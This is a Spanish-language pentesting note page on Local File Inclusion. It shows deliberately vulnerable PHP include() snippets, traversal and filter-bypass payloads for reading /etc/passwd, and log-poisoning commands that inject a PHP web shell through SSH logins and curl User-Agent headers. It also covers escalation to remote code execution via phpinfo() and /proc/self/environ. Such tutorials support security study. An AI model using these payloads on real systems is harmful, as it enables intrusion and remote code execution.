<!DOCTYPE html> <html><head>
		<title>LFI - (Local File Inclusion)</title>
		<base href="..\..\..\..\..\..\..\..\../">
		<meta id="root-path" root-path="..\..\..\..\..\..\..\..\../">
		<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, minimum-scale=1.0, maximum-scale=5.0">
		<meta charset="UTF-8">
		<meta name="description" content="Hacking - LFI - (Local File Inclusion)">
		<meta property="og:title" content="LFI - (Local File Inclusion)">
		<meta property="og:description" content="Hacking - LFI - (Local File Inclusion)">
		<meta property="og:type" content="website">
		<meta property="og:url" content="notes/4.-cybersecurity/redteam/pentesting/sistemas/2.-fases-auditoria/2.-explotación/vulnerabilidades/linux/lfi-(local-file-inclusion).html">
		<meta property="og:image" content="undefined">
		<meta property="og:site_name" content="Hacking">
		<link rel="alternate" type="application/rss+xml" title="RSS Feed" href="lib/rss.xml"><script async="" id="webpage-script" src="lib/scripts/webpage.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script type="module" async="" id="graph-view-script" src="lib/scripts/graph-view.js"></script><script async="" id="graph-wasm-script" src="lib/scripts/graph-wasm.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="graph-render-worker-script" src="lib/scripts/graph-render-worker.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="tinycolor-script" src="lib/scripts/tinycolor.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="pixi-script" src="https://cdnjs.cloudflare.com/ajax/libs/pixi.js/7.4.0/pixi.min.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><script async="" id="minisearch-script" src="https://cdn.jsdelivr.net/npm/minisearch@6.3.0/dist/umd/index.min.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><link rel="icon" href="lib/media/favicon.png"><script async="" id="graph-data-script" src="lib/scripts/graph-data.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><style>body{--line-width:40em;--line-width-adaptive:40em;--file-line-width:40em;--sidebar-width:min(20em, 80vw);--collapse-arrow-size:11px;--tree-horizontal-spacing:0.6em;--tree-vertical-spacing:0.6em;--sidebar-margin:12px}.sidebar{height:100%;min-width:calc(var(--sidebar-width) + var(--divider-width-hover));max-width:calc(var(--sidebar-width) + var(--divider-width-hover));font-size:14px;z-index:10;position:relative;overflow:hidden;transition:min-width ease-in-out,max-width ease-in-out;transition-duration:.2s;contain:size}.sidebar-left{left:0}.sidebar-right{right:0}.sidebar.is-collapsed{min-width:0;max-width:0}body.floating-sidebars .sidebar{position:absolute}.sidebar-content{height:100%;min-width:calc(var(--sidebar-width) - var(--divider-width-hover));top:0;padding:var(--sidebar-margin);padding-top:4em;line-height:var(--line-height-tight);background-color:var(--background-secondary);transition:background-color,border-right,border-left,box-shadow;transition-duration:var(--color-fade-speed);transition-timing-function:ease-in-out;position:absolute;display:flex;flex-direction:column}.sidebar:not(.is-collapsed) .sidebar-content{min-width:calc(max(100%,var(--sidebar-width)) - 3px);max-width:calc(max(100%,var(--sidebar-width)) - 3px)}.sidebar-left .sidebar-content{left:0;border-top-right-radius:var(--radius-l);border-bottom-right-radius:var(--radius-l)}.sidebar-right .sidebar-content{right:0;border-top-left-radius:var(--radius-l);border-bottom-left-radius:var(--radius-l)}.sidebar:has(.sidebar-content:empty):has(.topbar-content:empty){display:none}.sidebar-topbar{height:2em;width:var(--sidebar-width);top:var(--sidebar-margin);padding-inline:var(--sidebar-margin);z-index:1;position:fixed;display:flex;align-items:center;transition:width ease-in-out;transition-duration:inherit}.sidebar.is-collapsed .sidebar-topbar{width:calc(2.3em + var(--sidebar-margin) * 2)}.sidebar .sidebar-topbar.is-collapsed{width:0}.sidebar-left .sidebar-topbar{left:0}.sidebar-right .sidebar-topbar{right:0}.topbar-content{overflow:hidden;overflow:clip;width:100%;height:100%;display:flex;align-items:center;transition:inherit}.sidebar.is-collapsed .topbar-content{width:0;transition:inherit}.clickable-icon.sidebar-collapse-icon{background-color:transparent;color:var(--icon-color-focused);padding:0!important;margin:0!important;height:100%!important;width:2.3em!important;margin-inline:0.14em!important;position:absolute}.sidebar-left .clickable-icon.sidebar-collapse-icon{transform:rotateY(180deg);right:var(--sidebar-margin)}.sidebar-right .clickable-icon.sidebar-collapse-icon{transform:rotateY(180deg);left:var(--sidebar-margin)}.clickable-icon.sidebar-collapse-icon svg.svg-icon{width:100%;height:100%}.sidebar-section-header{margin:0 0 1em 0;text-transform:uppercase;letter-spacing:.06em;font-weight:600}body{transition:background-color var(--color-fade-speed) ease-in-out}.webpage-container{display:flex;flex-direction:row;height:100%;width:100%;align-items:stretch;justify-content:center}.document-container{opacity:1;flex-basis:100%;max-width:100%;width:100%;height:100%;display:flex;flex-direction:column;align-items:center;transition:opacity .2s ease-in-out;contain:inline-size}.hide{opacity:0;transition:opacity .2s ease-in-out}.document-container>.markdown-preview-view{margin:var(--sidebar-margin);margin-bottom:0;width:100%;width:-webkit-fill-available;width:-moz-available;width:fill-available;background-color:var(--background-primary);transition:background-color var(--color-fade-speed) ease-in-out;border-top-right-radius:var(--window-radius,var(--radius-m));border-top-left-radius:var(--window-radius,var(--radius-m));overflow-x:hidden!important;overflow-y:auto!important;display:flex!important;flex-direction:column!important;align-items:center!important;contain:inline-size}.document-container>.markdown-preview-view>.markdown-preview-sizer{padding-bottom:80vh!important;width:100%!important;max-width:var(--line-width)!important;flex-basis:var(--line-width)!important;transition:background-color var(--color-fade-speed) ease-in-out;contain:inline-size}.markdown-rendered img:not([width]),.view-content img:not([width]){max-width:100%;outline:0}.document-container>.view-content.embed{display:flex;padding:1em;height:100%;width:100%;align-items:center;justify-content:center}.document-container>.view-content.embed>*{max-width:100%;max-height:100%;object-fit:contain}:has(> :is(.math,table)){overflow-x:auto!important}.document-container>.view-content{overflow-x:auto;contain:content;padding:0;margin:0;height:100%}.scroll-highlight{position:absolute;width:100%;height:100%;pointer-events:none;z-index:1000;background-color:hsla(var(--color-accent-hsl),.25);opacity:0;padding:1em;inset:50%;translate:-50% -50%;border-radius:var(--radius-s)}</style><script defer="">async function loadIncludes(){if("file:"!=location.protocol){let e=document.querySelectorAll("include");for(let t=0;t<e.length;t++){let o=e[t],l=o.getAttribute("src");try{const e=await fetch(l);if(!e.ok){console.log("Could not include file: "+l),o?.remove();continue}let t=await e.text(),n=document.createRange().createContextualFragment(t),i=Array.from(n.children);for(let e of i)e.classList.add("hide"),e.style.transition="opacity 0.5s ease-in-out",setTimeout((()=>{e.classList.remove("hide")}),10);o.before(n),o.remove(),console.log("Included file: "+l)}catch(e){o?.remove(),console.log("Could not include file: "+l,e);continue}}}else{if(document.querySelectorAll("include").length>0){var e=document.createElement("div");e.id="error",e.textContent="Web server exports must be hosted on an http / web server to be viewed correctly.",e.style.position="fixed",e.style.top="50%",e.style.left="50%",e.style.transform="translate(-50%, -50%)",e.style.fontSize="1.5em",e.style.fontWeight="bold",e.style.textAlign="center",document.body.appendChild(e),document.querySelector(".document-container")?.classList.remove("hide")}}}document.addEventListener("DOMContentLoaded",(()=>{loadIncludes()}));let isFileProtocol="file:"==location.protocol;function waitLoadScripts(e,t){let o=e.map((e=>document.getElementById(e+"-script"))),l=0;!function e(){let n=o[l];l++,n&&"true"!=n.getAttribute("loaded")||l<o.length&&e(),l<o.length?n.addEventListener("load",e):t()}()}</script><link rel="stylesheet" href="lib/styles/obsidian.css"><link rel="stylesheet" href="lib/styles/theme.css"><link rel="preload" href="lib/styles/global-variable-styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="lib/styles/global-variable-styles.css"></noscript><link rel="preload" href="lib/styles/main-styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="lib/styles/main-styles.css"></noscript></head><body class="publish css-settings-manager theme-dark show-inline-title"><script defer="">let theme=localStorage.getItem("theme")||(window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light");"dark"==theme?(document.body.classList.add("theme-dark"),document.body.classList.remove("theme-light")):(document.body.classList.add("theme-light"),document.body.classList.remove("theme-dark")),window.innerWidth<480?document.body.classList.add("is-phone"):window.innerWidth<768?document.body.classList.add("is-tablet"):window.innerWidth<1024?document.body.classList.add("is-small-screen"):document.body.classList.add("is-large-screen")</script><div class="webpage-container workspace"><div class="sidebar-left sidebar"><div class="sidebar-handle"></div><div class="sidebar-topbar"><div class="topbar-content"><label class="theme-toggle-container" for="theme_toggle"><input class="theme-toggle-input" type="checkbox" id="theme_toggle"><div class="toggle-background"></div></label></div><div class="clickable-icon sidebar-collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div><div class="sidebar-content"><div class="search-input-container"><input enterkeyhint="search" type="search" spellcheck="false" placeholder="Search..."><div class="search-input-clear-button" aria-label="Clear search"></div></div><include src="lib/html/file-tree.html"></include></div><script defer="">let ls = document.querySelector(".sidebar-left"); ls.classList.add("is-collapsed"); if (window.innerWidth > 768) ls.classList.remove("is-collapsed"); ls.style.setProperty("--sidebar-width", localStorage.getItem("sidebar-left-width"));</script></div><div class="document-container markdown-reading-view hide"><div class="markdown-preview-view markdown-rendered allow-fold-headings allow-fold-lists is-readable-line-width"><style id="MJX-CHTML-styles"></style><div class="markdown-preview-sizer markdown-preview-section"><h1 class="page-title heading inline-title" id="LFI - (Local File Inclusion)"><p>LFI - (Local File Inclusion)</p></h1><div><hr></div><div><ul>
<li data-line="0">Tags: <a href="?query=tag:basico" class="tag" target="_blank" rel="noopener">#basico</a> <a href="?query=tag:ataques" class="tag" target="_blank" rel="noopener">#ataques</a> <a href="?query=tag:teoria" class="tag" target="_blank" rel="noopener">#teoria</a> <a href="?query=tag:practica" class="tag" target="_blank" rel="noopener">#practica</a> </li>
</ul></div><div><hr></div><div class="heading-wrapper"><h1 data-heading="¿ Que es un **LFI** ?" class="heading" id="¿_Que_es_un_**LFI**_?">¿ Que es un <strong>LFI</strong> ?</h1><div class="heading-children"><div><p>El <strong>LFI</strong> es una vulnerabilidad de seguridad informática que se produce cuando una aplicación web <strong>no valida adecauadamente</strong> las entradas del usuario, permitiendo a un atacante <strong>acceder a archvios locales</strong> en el servidor web.</p></div><div><p>Muchas veces, los atacantes aprovechas el <strong>FLI</strong> al abusar de parámetros de entrada en la aplicación web. Los parámetros de entrada son datos que los usuarios ingresan en la aplicación web, como las URL o los campos de formulario. Los atacantes pueden manipular los parámetros de entrada para incluir rutas de archivo local en la solicitud, lo que puede permitires acceder a archivos en el servidor web. Esta técnica se conoce como <strong>"Path Traversal"</strong> y se utiliza comúnmente en ataques de <strong>LFI</strong>.</p></div><div><hr></div></div></div><div class="heading-wrapper"><h1 data-heading="Explotación" class="heading" id="Explotación">Explotación</h1><div class="heading-children"><div><p>Para enumerar los posibles <strong>LFI</strong> y su respectiva explotación lo vamos a hacer de manera local junto a un archivo php para levantar nuestro servicio de apache, de esta manera, podemos ver como un desarrollador podria encarar el intento de <strong>LFI</strong> asi como <strong>burlarlo</strong>. </p></div><div class="heading-wrapper"><h4 data-heading="Archivo index.php" class="heading" id="Archivo_index.php"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Archivo index.php</h4><div class="heading-children"><div><pre class="language-php" tabindex="0"><code class="language-php is-loaded">	<span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token global">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
</code><button class="copy-code-button">Copy</button></pre></div><div><p>Esto seria la <strong>LFI</strong> más basica, ya que directamente es confia en el input del usuario, donde se lee una query de la url con nombre file para incluirla a invel de sistema. Con poner en la url <code>....?file=/etc/passwd</code> estariamos leyendo archivos locales del sistema.</p></div></div></div><div class="heading-wrapper"><h4 data-heading="Intento triste de sanitización" class="heading" id="Intento_triste_de_sanitización"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Intento triste de sanitización</h4><div class="heading-children"><div><pre class="language-php" tabindex="0"><code class="language-php is-loaded">	<span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token global">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/var/www/html"</span> <span class="token operator">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code><button class="copy-code-button">Copy</button></pre></div><div><p>Este "intento" de sanitización intenta obligar al usuario a introducir un arhivo de manera que se lo concatena con la ruta /var/www/html intentando obligar asi a que el archivo se encuentre en esta ruta, pero burlarlo, una vez más es posible, ya que jugando con <strong>Path Traversal</strong> se puede realizar ingresando en la url  <code>...?file=../../../../../../../etc/passwd</code> estariamos volviendo a leer archivos locales del sistema.</p></div></div></div><div class="heading-wrapper"><h4 data-heading="Segundo intento de sanitización" class="heading" id="Segundo_intento_de_sanitización"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Segundo intento de sanitización</h4><div class="heading-children"><div><pre class="language-php" tabindex="0"><code class="language-php is-loaded">	<span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token global">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"../"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
</code><button class="copy-code-button">Copy</button></pre></div><div><p>En este nuevo intento, el desarrollador podria estar intentando evitar un <strong>Path Traversal</strong> de manera que intenta remplazar los valores <code>../</code> por <code>''</code> , es decir que esta eliminando de nuestro input los ../, pero, una vez más esto sigue siendo vulnerable, ya que este remplazo no es de manera recursiva, por lo que si ahora ingresamos en la url el valor de <code>...?file=....//....//....//....//....//....//....//....//....//....//etc/passwd</code> estariamos una vez más volviendo a leer archivos locales del sistema.</p></div></div></div><div class="heading-wrapper"><h4 data-heading="Jugando con regex" class="heading" id="Jugando_con_regex"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Jugando con regex</h4><div class="heading-children"><div><pre class="language-php" tabindex="0"><code class="language-php is-loaded">	<span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token global">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"../"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\/etc\/passwd/"</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"\n[!] No es posible visualizar el contenido de este archivo.\n"</span><span class="token punctuation">;</span> 
	<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>  
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/var/www/html/"</span> <span class="token operator">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token string backtick-quoted-string">``</span><span class="token string backtick-quoted-string">`

En este caso, no solo esta intentando evitar un **Path Traversal** como anteriormente si no que tambien esta jugando con regex para evitar la string `</span><span class="token operator">/</span>etc<span class="token operator">/</span>passwd<span class="token string backtick-quoted-string">`, pero esto sigue siendo vulnerable, no solo por el hecho de que jugando con `</span><span class="token operator">...</span><span class="token operator">.</span><span class="token comment">//` se puede listar cualquier archivo, si no que tambien, podriamos listar el etc/passwd ya que la regex filtra por exctamente /etc/passwd por lo que podriamos ingrear `/etc/////./././///////passwd` y seguiriamos pudiendo listar este y cualquier archivo local del sistema.  (Se pueden ingresar cuantas barras '/' y puntos '.' querramos.)</span>

Tambien a nivel de sistema<span class="token punctuation">,</span> cuando usamos el <span class="token string backtick-quoted-string">`?`</span> se pueden buscar archivos<span class="token punctuation">,</span> por ejemplo <span class="token string backtick-quoted-string">`cat /e?c/pa??wd`</span><span class="token operator">.</span> 

<span class="token comment">#### Forzando extensiones de archvios</span>
<span class="token string backtick-quoted-string">``</span>`<span class="token class-name type-declaration">php</span>
<span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token global">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"../"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/var/www/html/"</span> <span class="token operator">.</span> <span class="token variable">$filename</span> <span class="token operator">.</span> <span class="token string double-quoted-string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
</code><button class="copy-code-button">Copy</button></pre></div><div><p>En este caso el desarrollador estaria intentando forzarnos a que lo que ingresemos tenga la extención .php, por lo que si quisieramos ingresar /etc/passwd estariamos ingresando /etc/passwd.php (En caso de sortear todo tipo de validación posible). En este caso, lo que podriamos hacer es hacer uso de un <strong>NULL Byte</strong>, es importante aclarar que esto funciona para versiones antiguas de php y no actuales. Solo haria falta poner en la url<br>
<code>...?file=....//....//....//....//....//....//....//....//....//etc/passwd%00</code>, el <strong>%00</strong> es un null Byte, lo cual anula lo posterior al mismo, anulando asi la extención '.php'. </p></div><div><p>Tambien si se hiciera una validación tal que  <code>if(substr($argv[1],-6,6)!="passwd") include($argv[1]);</code> asi, en donde se evalua que los ultimos 6 caracteres no sean "passwd", para versiones antiguas de php, podriamos utilizar el <code>/.</code> para burlar esto, de manera que si ingresamos <code>/etc/passwd/.</code> estariamos burlando la validación. Lo mismo que si se utilizara lo mismo para validar extenciones, por ejemplo<code>if(substr($argv[1],-4,4)!=".txt") include($argv[1]);</code>, de esta manera no podriamos ver  archivos .txt, pero si hicieramos <code>file.txt/.</code> una vez más, estariamos burlando esto. </p></div><div><hr></div></div></div></div></div><div class="heading-wrapper"><h1 data-heading="Log Poisoning - ( **LFI** migrado a [[RCE - (Remote Command Execution)]] )" class="heading" id="Log_Poisoning_-_(_**LFI**_migrado_a_[[RCE_-_(Remote_Command_Execution)]]_)">Log Poisoning - ( <strong>LFI</strong> migrado a <a data-href="RCE - (Remote Command Execution)" href="notes/4.-cybersecurity/redteam/pentesting/sistemas/2.-fases-auditoria/2.-explotación/vulnerabilidades/linux/rce-(remote-command-execution).html" class="internal-link" target="_self" rel="noopener">RCE - (Remote Command Execution)</a> )</h1><div class="heading-children"><div><p>El <strong>Log Poisoning</strong> es una técnica de ataque en la que un atacante <strong>manipula</strong> los <strong>archivos de registro (logs)</strong> de una aplicación web para lograr un resultado malintencionado. Esta técnica puede ser utilizada en conjunto con una vulnerabilidad <strong>LFI</strong> para lograr un <a data-href="RCE - (Remote Command Execution)" href="notes/4.-cybersecurity/redteam/pentesting/sistemas/2.-fases-auditoria/2.-explotación/vulnerabilidades/linux/rce-(remote-command-execution).html" class="internal-link" target="_self" rel="noopener">RCE - (Remote Command Execution)</a>.  </p></div><div><p>Esto se puede dar abusando de los archivos de logs de ssh, Mail, Apache, etc.</p></div><div><ul>
<li data-line="0">
<h2 data-heading="SSH" class="heading" id="SSH">SSH</h2>
<p>Podriamos desde un <strong>LFI</strong> ver la ruta <code>/var/log/auth.log</code> o <code>/var/log/btmp</code>, entre otras, para ver los logs de SSH, y de esta manera, en caso de que los podamos ver, envenenar el log (<strong>Log Poisoning</strong>) intentando conectarnos a ssh por ejemplo con el comando <code>ssh '&lt;?php system($_GET["cmd"]); ?&gt;'@192.168.1.38</code>. </p>
</li>
<li data-line="3">
<h2 data-heading="Apache" class="heading" id="Apache">Apache</h2>
<p>Podriamos desde un <strong>LFI</strong> ver la ruta <code>/var/log/apache2/access.log</code>, entre otras, para ver los logs de Apache, y de esta manera, en caso de que los podamos ver, envenenear el log (<strong>Log Poisoning</strong>) intentando hacer un curl a la ruta y inyectando el comando php en el User-Agent con el comando <code>curl -s -X GET 'http://192.168.1.38' -d 'User-Agent: &lt;?php system($_GET["cmd"]); ?&gt;'</code> o con  <code>curl -s -X GET 'http://192.168.1.38' -A '&lt;?php system("whoami"); ?&gt;'</code>.</p>
</li>
</ul></div><div><hr></div></div></div><div class="heading-wrapper"><h1 data-heading="LFI to [[RCE - (Remote Command Execution)]] a través de phpinfo()" class="heading" id="LFI_to_[[RCE_-_(Remote_Command_Execution)]]_a_través_de_phpinfo()">LFI to <a data-href="RCE - (Remote Command Execution)" href="notes/4.-cybersecurity/redteam/pentesting/sistemas/2.-fases-auditoria/2.-explotación/vulnerabilidades/linux/rce-(remote-command-execution).html" class="internal-link" target="_self" rel="noopener">RCE - (Remote Command Execution)</a> a través de phpinfo()</h1><div class="heading-children"><div><p>Cuando tenemos un recurso en una web el cual nos lista la función <strong>phpinfo()</strong>, si tenemos un <strong>LFI</strong> podríamos derivarlo a un <a data-href="RCE - (Remote Command Execution)" href="notes/4.-cybersecurity/redteam/pentesting/sistemas/2.-fases-auditoria/2.-explotación/vulnerabilidades/linux/rce-(remote-command-execution).html" class="internal-link" target="_self" rel="noopener">RCE - (Remote Command Execution)</a> siempre y cuando la funcionalidad <strong>file_uploads = On</strong>, en caso de que esto  sea así, tendríamos un <em>RCE</em>. </p></div><div><p>Con <a data-href="Burpsuite" href="notes/4.-cybersecurity/redteam/pentesting/sistemas/herramientas/burpsuite.html" class="internal-link" target="_self" rel="noopener">Burpsuite</a> deberíamos interceptar la petición al recurso en donde se lista el <strong>phpinfo()</strong> y <em>cambiar el método GET a POST</em> así como también simular el formato que aparece cuando enviamos archivos, esto lo podemos hacer googleando <a data-tooltip-position="top" aria-label="https://stackoverflow.com/questions/14962592/whats-content-type-value-within-a-http-request-when-uploading-content" rel="noopener" class="external-link" href="https://stackoverflow.com/questions/14962592/whats-content-type-value-within-a-http-request-when-uploading-content" target="_blank">"como es el formato del content type cuando subimos archivos"</a>  y nos encontraremos con el siguiente formato: </p></div><div><p><code>Content-Type: multipart/form-data;boundary=&lt;UN_NOMBRE_X&gt;</code></p></div><div><p><code>--&lt;UN_NOMBRE_X&gt;</code><br>
<code>Content-Disposition: form-data; name="name"; filename=&lt;file_to_upload.extención&gt;</code><br>
<code>Content-Type: text/plain</code></p></div><div><p><code>&lt;content_file_to_upload&gt;</code><br>
<code>--&lt;UN_NOMBRE_X&gt;</code></p></div><div><p>De esta manera podríamos intentar subir un archivo <em>php</em> el cual ejecute una determinada acción, en caso de que este ataque sea exitoso, podríamos ver en la respuesta del lado del servidor, que si filtramos por el nombre del archivo que hayamos subido, veríamos algo como lo siguiente: </p></div><div><p><strong>(<br>
[name] =&gt; &lt;file_to_upload.extención&gt;<br>
[type] =&gt; text/plain<br>
[tmp_name] =&gt; /tmp/phpLQnUDn<br>
[error] =&gt; 0<br>
[size] =&gt; 71<br>
)</strong></p></div><div><p>De esta manera se nos proporciona el directorio temporal en el que fue creado, en este ejemplo <strong>[tmp_name] =&gt; /tmp/phpLQnUDn</strong> por lo que si ahora, con el <strong>LFI</strong> apuntamos a la ruta <strong>"/tmp/phpLQnUDn/&lt;file_to_upload.extención&gt;"</strong>, no tendríamos nada. Por que? Por que como lo crea, inmediatamente lo borra, ya que es un archivo temporal, por lo que habría que jugar con <a data-href="Race Conditions - Condiciones de carrera" href="notes/4.-cybersecurity/redteam/pentesting/sistemas/2.-fases-auditoria/2.-explotación/vulnerabilidades/linux/race-conditions-condiciones-de-carrera.html" class="internal-link" target="_self" rel="noopener">Race Conditions - Condiciones de carrera</a> para que en algún momento logre ejecutarse el código de manera óptima.</p></div><div><p>Obvio que es lo podemos hacer con <a data-tooltip-position="top" aria-label="https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/phpinfolfi.py" rel="noopener" class="external-link" href="https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/phpinfolfi.py" target="_blank">scripts</a> los cuales ya están automatizados </p></div><div><hr></div></div></div><div class="heading-wrapper"><h1 data-heading="-> Cheatsheets: + [HackTricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion) + [ironhackers](https://ironhackers.es/herramientas/lfi-cheat-sheet/) + [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion) + [OSCP Guide by sushant747](https://sushant747.gitbooks.io/total-oscp-guide/content/local_file_inclusion.html)" class="heading" id="->_Cheatsheets:_+_[HackTricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion)_+_[ironhackers](https://ironhackers.es/herramientas/lfi-cheat-sheet/)_+_[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)_+_[OSCP_Guide_by_sushant747](https://sushant747.gitbooks.io/total-oscp-guide/content/local_file_inclusion.html)">-&gt; Cheatsheets: + <a data-tooltip-position="top" aria-label="https://book.hacktricks.xyz/pentesting-web/file-inclusion" rel="noopener" class="external-link" href="https://book.hacktricks.xyz/pentesting-web/file-inclusion" target="_blank">HackTricks</a> + <a data-tooltip-position="top" aria-label="https://ironhackers.es/herramientas/lfi-cheat-sheet/" rel="noopener" class="external-link" href="https://ironhackers.es/herramientas/lfi-cheat-sheet/" target="_blank">ironhackers</a> + <a data-tooltip-position="top" aria-label="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion" rel="noopener" class="external-link" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion" target="_blank">PayloadsAllTheThings</a> + <a data-tooltip-position="top" aria-label="https://sushant747.gitbooks.io/total-oscp-guide/content/local_file_inclusion.html" rel="noopener" class="external-link" href="https://sushant747.gitbooks.io/total-oscp-guide/content/local_file_inclusion.html" target="_blank">OSCP Guide by sushant747</a></h1><div class="heading-children"><div class="heading-wrapper"><h2 data-heading="LFI to RCE via /proc/self/environ" class="heading" id="LFI_to_RCE_via_/proc/self/environ"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>LFI to RCE via /proc/self/environ</h2><div class="heading-children"><div><p>Like a log file, send the payload in the User-Agent, it will be reflected inside the <code>/proc/self/environ</code> file </p></div><div><pre class="language-powershell" tabindex="0"><code class="language-powershell is-loaded">GET vulnerable<span class="token punctuation">.</span>php?filename=<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>proc/self/environ HTTP/1<span class="token punctuation">.</span>1 User-Agent: &lt;?=phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> ?&gt; 
